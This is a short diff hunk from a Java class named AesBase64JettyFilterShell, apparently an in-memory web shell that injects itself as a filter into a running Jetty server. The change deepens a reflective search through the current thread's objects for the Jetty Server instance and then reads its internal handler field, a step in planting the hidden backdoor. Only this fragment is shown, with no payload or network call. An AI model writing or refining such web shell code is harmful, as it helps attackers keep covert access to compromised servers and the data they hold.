@@ -94,7 +94,7 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         blackType.add(Character.class.getName());
         blackType.add(Boolean.class.getName());
         blackType.add(String.class.getName());
-        Object jettyServer = searchObject("org.eclipse.jetty.server.Server", Thread.currentThread(), new HashSet(), blackType, 10, 0);
+        Object jettyServer = searchObject("org.eclipse.jetty.server.Server", Thread.currentThread(), new HashSet(), blackType, 50, 0);
         if (jettyServer != null) {
             try {
                 Object serverHandle = getFieldValue(jettyServer, "_handler");
